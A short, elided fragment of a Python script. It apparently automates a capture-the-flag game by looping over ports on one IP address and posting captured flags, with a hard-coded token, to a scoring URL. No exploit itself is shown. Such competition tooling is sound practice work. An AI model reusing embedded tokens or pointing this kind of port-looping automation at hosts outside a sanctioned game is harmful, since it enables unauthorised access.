...
def subflag(flag):
    ...
    url = "http://47.244.12.21/commit/flag"
    data = {'flag':flag ,'token':'0280968d37a8b7070b07e2f20f68c81d'}
...
if __name__ == "__main__":
    ip="47.244.12.21"
    port=[20180,20080,20280,20380,20480,20780,21180,21380,21480,21580,21780]
    per_time=""
    while 1:
        for i in port:
            try :
